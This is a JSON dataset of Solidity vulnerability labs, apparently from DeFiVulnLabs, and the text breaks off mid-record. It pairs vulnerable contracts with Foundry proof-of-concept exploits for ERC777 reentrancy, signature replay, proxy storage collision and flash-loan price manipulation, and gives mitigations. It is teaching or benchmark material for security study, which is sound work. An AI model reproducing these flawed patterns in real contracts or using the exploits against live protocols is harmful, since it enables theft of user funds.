[
  {
    "id": "defivulnlabs_erc777-reentrancy",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ERC777-reentrancy.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC777/ERC777.sol\";\n\n/*\nName: ERC777 Reentrancy Vulnerability\n\nDescription:\nERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.\nMalicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used. \n\nScenario:\nMaximum claims is 1,000 for each EOA, How can you bypass this limitation?\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5\n\n*/\n\ncontract ContractTest is Test {\n    MyERC777 MyERC777TokenContract;\n    SimpleBank SimpleBankContract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH =\n        keccak256(\"ERC777TokensSender\");\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n        MyERC777TokenContract = new MyERC777(0);\n    }\n\n    function testERC777Reentrancy() public {\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        // tokensReceived Hook\n        // The token contract MUST call the tokensReceived hook of the recipient if the recipient registers an ERC777TokensRecipient implementation via ERC-1820.\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n        //set up env\n        SimpleBankContract = new SimpleBank(address(MyERC777TokenContract));\n        MyERC777TokenContract.mint(address(SimpleBankContract), 10000, \"\", \"\");\n\n        console.log(\n            \"Maximum claims is 1,000 for each EOA, How can you bypass this limitation?\"\n        );\n        console.log(\n            \"Before exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n        SimpleBankContract.claim(address(this), 900); // claim token to trigger callback function `tokensReceived()`.\n        // Expect 900 (the claim amount), but we will get the 1,900 due to reenter to claim 1,000.\n        console.log(\n            \"After exploiting, My GLD Balance :\",\n            MyERC777TokenContract.balanceOf(address(this))\n        );\n    }\n\n    function tokensReceived(\n        address payable operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {\n        if (MyERC777TokenContract.balanceOf(address(this)) <= 1000) {\n            console.log(\"Reentered\");\n            // exploit here, claim 1,000 tokens.\n            SimpleBank(operator).claim(address(this), 1000);\n        }\n    }\n\n    receive() external payable {}\n}\n\ncontract MyERC777 is ERC777 {\n    constructor(\n        uint256 initialSupply\n    ) ERC777(\"Gold\", \"GLD\", new address[](0)) {}\n    function mint(\n        address account,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData\n    ) public returns (bool) {\n        _mint(account, amount, userData, operatorData);\n        return true;\n    }\n}\n\ncontract SimpleBank is Test {\n    ERC777 private token;\n    uint maxMintsPerAddress = 1000;\n    mapping(address => uint256) public _mints;\n    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =\n        keccak256(\"ERC777TokensRecipient\");\n\n    function setUp() external {\n        // mock ERC1820Registry contract in foundry\n        vm.etch(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),\n            bytes(\n                hex\"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029\"\n            )\n        );\n    }\n    constructor(address nftAddress) {\n        token = ERC777(nftAddress);\n\n        // Register IERC1820Registry\n        IERC1820Registry registry = IERC1820Registry(\n            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n        );\n        registry.setInterfaceImplementer(\n            address(this),\n            _TOKENS_RECIPIENT_INTERFACE_HASH,\n            address(this)\n        );\n    }\n\n    function claim(address account, uint256 amount) public returns (bool) {\n        // Check if total claims for the address would exceed max mints per address.\n        require(\n            _mints[account] + amount <= maxMintsPerAddress,\n            \"Exceeds max mints per address\"\n        );\n\n        token.transfer(account, amount);\n        _mints[account] += amount; // Do not follow check-effect-interaction\n\n        return true;\n    }\n\n    function tokensReceived(\n        address operator,\n        address from,\n        address to,\n        uint256 amount,\n        bytes calldata data,\n        bytes calldata operatorData\n    ) external {}\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "contract MyERC777 {\n    constructor(\n        uint256 initialSupply\n    ) ERC777(\"Gold\", \"GLD\", new address[](0)) {}\n    function mint(\n        address account,\n        uint256 amount,\n        bytes memory userData,\n        bytes memory operatorData\n    ) public returns (bool) {\n        _mint(account, amount, userData, operatorData);\n        return true;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "ERC777 Reentrancy Vulnerability",
    "description": "ERC777 tokens allow arbitrary callbacks via hooks that are called during token transfers.\nMalicious contract addresses may cause reentrancy on such callbacks if reentrancy guards are not used.",
    "scenario": "Maximum claims is 1,000 for each EOA, How can you bypass this limitation?",
    "fix_description": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.",
    "references": [
      "https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/ERC777-reentrancy.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_signaturereplay",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SignatureReplay.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Signature Replay Vulnerability\n\nDescription:\nIn this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account \nto Bob's account. Bob then replays this signature on multiple contracts \n(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens \nfrom Alice's account to his. This is possible because the contracts use the same methodology for signing\nand validating transactions, but they do not share a nonce to prevent replay attacks.\n\nMissing protection against signature replay attacks, Same signature can be used multiple times to execute a function.\n\nMitigation:\nReplay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process. \n\nREF:\nhttps://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57\nhttps://medium.com/cypher-core/replay-attack-vulnerability-in-ethereum-smart-contracts-introduced-by-transferproxy-124bf3694e25\n\n*/\n\ncontract ContractTest is Test {\n    TokenWhale TokenWhaleContract;\n    SixEyeToken SixEyeTokenContract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    constructor() {\n        TokenWhaleContract = new TokenWhale();\n        TokenWhaleContract.TokenWhaleDeploy(address(this));\n        TokenWhaleContract.transfer(alice, 1000);\n        SixEyeTokenContract = new SixEyeToken();\n        SixEyeTokenContract.TokenWhaleDeploy(address(this));\n        SixEyeTokenContract.transfer(alice, 1000);\n    }\n\n    function testSignatureReplay() public {\n        emit log_named_uint(\n            \"Balance\",\n            TokenWhaleContract.balanceOf(address(this))\n        );\n\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                address(alice),\n                address(bob),\n                uint256(499),\n                uint256(1),\n                uint256(0)\n            )\n        );\n        emit log_named_bytes32(\"hash\", hash);\n\n        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v\n        //r - a point on the secp256k1 elliptic curve (32 bytes)\n        //s - a point on the secp256k1 elliptic curve (32 bytes)\n        //v - recovery id (1 byte)\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);\n        emit log_named_uint(\"v\", v);\n        emit log_named_bytes32(\"r\", r);\n        emit log_named_bytes32(\"s\", s);\n\n        address alice_address = ecrecover(hash, v, r, s);\n        emit log_named_address(\"alice_address\", alice_address);\n        emit log_string(\n            \"If attacker got the Alice's signature, the attacker can replay this signature on the others contracts with same method.\"\n        );\n        vm.startPrank(bob);\n\n        TokenWhaleContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        // Bob successfully transferred funds from Alice.\n        emit log_named_uint(\n            \"SET token balance of Bob\",\n            TokenWhaleContract.balanceOf(address(bob))\n        );\n\n        // Because we have nonce protect to replay, so we can not replay again in the same contract.\n        // BTW this nonce start from 0, it's not a best practice.\n        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);\n        // emit log_named_uint(\"Balance of Bob\",TokenWhaleContract.balanceOf(address(bob)));\n\n        emit log_string(\n            \"Try to replay to another contract with same signature\"\n        );\n        emit log_named_uint(\n            \"Before the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n\n        SixEyeTokenContract.transferProxy(\n            address(alice),\n            address(bob),\n            499,\n            1,\n            v,\n            r,\n            s\n        );\n        emit log_named_uint(\n            \"After the second replay, SIX token balance of bob:\",\n            SixEyeTokenContract.balanceOf(address(bob))\n        );\n    }\n}\n\ncontract TokenWhale is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        emit log_named_uint(\"nonce\", nonce);\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        nonces[_from] = nonce + 1;\n        return true;\n    }\n}\n\ncontract SixEyeToken is Test {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Six Eye Token\";\n    string public symbol = \"SIX\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        return true;\n    }\n}\n",
    "vulnerable_contract_only": "contract TokenWhale {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n    mapping(address => uint256) nonces;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 2000;\n        balanceOf[player] = 2000;\n    }\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _feeUgt,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public returns (bool) {\n        uint256 nonce = nonces[_from];\n        emit log_named_uint(\"nonce\", nonce);\n        bytes32 h = keccak256(\n            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)\n        );\n        if (_from != ecrecover(h, _v, _r, _s)) revert();\n\n        if (\n            balanceOf[_to] + _value < balanceOf[_to] ||\n            balanceOf[msg.sender] + _feeUgt < balanceOf[msg.sender]\n        ) revert();\n        balanceOf[_to] += _value;\n\n        balanceOf[msg.sender] += _feeUgt;\n\n        balanceOf[_from] -= _value + _feeUgt;\n        nonces[_from] = nonce + 1;\n        return true;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "signature_replay",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "Signature Replay Vulnerability",
    "description": "In this scenario, Alice signs a transaction that allows Bob to transfer tokens from Alice's account \nto Bob's account. Bob then replays this signature on multiple contracts \n(in this case, the TokenWhale and SixEyeToken contracts), each time authorizing the transfer of tokens \nfrom Alice's account to his. This is possible because the contracts use the same methodology for signing\nand validating transactions, but they do not share a nonce to prevent replay attacks.\n\nMissing protection against signature replay attacks, Same signature can be used multiple times to execute a function.",
    "scenario": "",
    "fix_description": "Replay attacks can be prevented by implementing a nonce, a number that is only used once, into the signing and verification process.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/SignatureReplay.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_storage-collision",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Storage-collision.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Storage Collision Vulnerability\n\nDescription:\nThe vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,\nnamely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. \nSince the Proxy contract is using the delegatecall method to interact with the Logic contract, \nthey share the same storage. If the foo function is called,\nit overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.\n\nMitigation:\nOne approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.\n\nREF:\nhttps://blog.openzeppelin.com/proxy-patterns\n*/\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    Proxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new Proxy(address(LogicContract));\n\n        console.log(\n            \"Current implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        ProxyContract.testcollision();\n        console.log(\n            \"overwritten slot0 implementation contract address:\",\n            ProxyContract.implementation()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Proxy {\n    address public implementation; //slot0\n\n    constructor(address _implementation) {\n        implementation = _implementation;\n    }\n\n    function testcollision() public {\n        bool success;\n        (success, ) = implementation.delegatecall(\n            abi.encodeWithSignature(\"foo(address)\", address(this))\n        );\n    }\n}\n\ncontract Logic {\n    address public GuestAddress; //slot0\n\n    constructor() {\n        GuestAddress = address(0x0);\n    }\n\n    function foo(address _addr) public {\n        GuestAddress = _addr;\n    }\n}\n",
    "vulnerable_contract_only": "contract Proxy {\n    address public implementation; //slot0\n\n    constructor(address _implementation) {\n        implementation = _implementation;\n    }\n\n    function testcollision() public {\n        bool success;\n        (success, ) = implementation.delegatecall(\n            abi.encodeWithSignature(\"foo(address)\", address(this))\n        );\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "storage_collision",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "Storage Collision Vulnerability",
    "description": "The vulnerability is that both the Proxy and Logic contracts use the same storage slot (slot 0) to store important variables,\nnamely the implementation address in the Proxy contract and the GuestAddress in the Logic contract. \nSince the Proxy contract is using the delegatecall method to interact with the Logic contract, \nthey share the same storage. If the foo function is called,\nit overwrites the implementation address in the Proxy contract, which results in an unexpected behavior.",
    "scenario": "",
    "fix_description": "One approach to mitigating this issue is to design the storage layout of the proxy and logic contracts to be consistent with each other.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Storage-collision.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_price_manipulation",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Price_manipulation.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Price manipulation\n\nDescription:\nIncorrect price calculation over balanceOf, getReverse may refer to a situation \nwhere the price of a token or asset is not accurately calculated based on the balanceOf function.\n\nMitigation:  \nUse a manipulation resistant oracle, chainlink, TWAP, etc.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673948842738487296\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221012-atk---flashloan-manipulate-price\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220807-egd-finance---flashloans--price-manipulation\nhttps://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20220428-deus-dao---flashloan--price-oracle-manipulation\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    USDb USDbContract;\n    SimplePool SimplePoolContract;\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        USDbContract = new USDb();\n        SimplePoolContract = new SimplePool(\n            address(USDaContract),\n            address(USDbContract)\n        );\n        SimpleBankContract = new SimpleBank(\n            address(USDaContract),\n            address(SimplePoolContract),\n            address(USDbContract)\n        );\n    }\n\n    function testPrice_Manipulation() public {\n        USDbContract.transfer(address(SimpleBankContract), 9000 ether);\n        USDaContract.transfer(address(SimplePoolContract), 1000 ether);\n        USDbContract.transfer(address(SimplePoolContract), 1000 ether);\n        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)\n        SimplePoolContract.getPrice(); // 1 USDa : 1 USDb\n\n        console.log(\n            \"There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb.\"\n        );\n        emit log_named_decimal_uint(\n            \"Current USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        );\n        console.log(\"Start price manipulation\");\n        console.log(\"Borrow 500 USBa over floashloan\");\n        // Let's manipulate the price since the getPrice is over the balanceOf.\n        // Use flashloan to borrow 500 USDa\n        SimplePoolContract.flashLoan(500 ether, address(this), \"0x0\");\n    }\n\n    fallback() external {\n        //flashlon callback\n\n        emit log_named_decimal_uint(\n            \"Price manupulated, USDa convert rate\",\n            SimplePoolContract.getPrice(),\n            18\n        ); // 1 USDa : 2 USDb\n\n        USDaContract.approve(address(SimpleBankContract), 100 ether);\n        SimpleBankContract.exchange(100 ether);\n\n        // Repay the flashloan by transferring 500 USDb to SimplePoolContract\n        USDaContract.transfer(address(SimplePoolContract), 500 ether);\n\n        // Get the balance of USDb owned by us.\n        emit log_named_decimal_uint(\n            \"Use 100 USDa to convert, My USDb balance\",\n            USDbContract.balanceOf(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract USDb is ERC20, Ownable {\n    constructor() ERC20(\"USDB\", \"USDB\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, 